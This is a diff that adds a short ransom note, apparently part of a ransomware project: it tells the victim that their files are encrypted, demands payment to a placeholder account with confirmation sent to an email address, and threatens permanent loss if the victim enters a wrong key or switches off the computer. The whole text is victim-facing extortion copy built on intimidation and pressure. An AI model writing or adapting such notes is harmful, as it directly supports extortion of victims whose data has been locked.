@@ -1,0 +1,13 @@
+NOTE: Clicking decrypt with incorrect key or false data in privateKey file will destroy the window and you wont get your files back.
+
+
+WHAT IS THIS ?
+	Your files have been encrypted and can only be decrypted by the key held by attacker.
+
+
+HOW DO I GET THE KEY ?
+	Pay the ransome to XXXXXXXXX and send the confirmation to hecker@earth.org. Once verified, you will recieve a file containing key.
+
+
+WHY CANT I TURN OFF MY COMPUTER ?
+	The key used for your file encryption will be lost and all your data will never get recovered
